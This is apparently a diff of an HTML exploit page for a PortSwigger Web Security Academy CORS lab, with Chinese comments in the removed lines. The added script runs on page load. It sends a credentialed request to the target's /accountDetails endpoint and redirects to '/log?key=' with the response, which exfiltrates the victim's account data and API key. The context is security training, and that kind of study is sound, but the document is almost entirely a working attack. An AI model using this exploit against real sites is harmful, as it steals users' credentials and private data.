@@ -10,33 +10,15 @@
   <pre id="result"></pre>
 
   <script>
-    document.getElementById('test').onclick = function() {
-      // 🔹 如果你需要传参，可以在这里拼接，比如 "?id=1"
-      const url = "https://0aa80099037623af80f02bee00f60012.web-security-academy.net/accountDetails";
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0aa60052032095b18262d42f00e10067.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
 
-      fetch(url, {
-        method: "GET",
-        credentials: "include", // 带上 Cookie
-        // 🚫 不要 body，不要 headers
-      })
-      .then(response => {
-        const contentType = response.headers.get("content-type");
-        if (contentType && contentType.includes("application/json")) {
-          return response.json();
-        } else {
-          return response.text();
-        }
-      })
-      .then(data => {
-        document.getElementById("result").textContent =
-          typeof data === "string" ? data : JSON.stringify(data, null, 2);
-        console.log("返回数据：", data);
-      })
-      .catch(error => {
-        document.getElementById("result").textContent = "请求失败或被拦截：" + error;
-        console.error(error);
-      });
+    function reqListener() {
+        location='/log?key='+this.responseText;
     };
-  </script>
+</script>
 </body>
 </html>
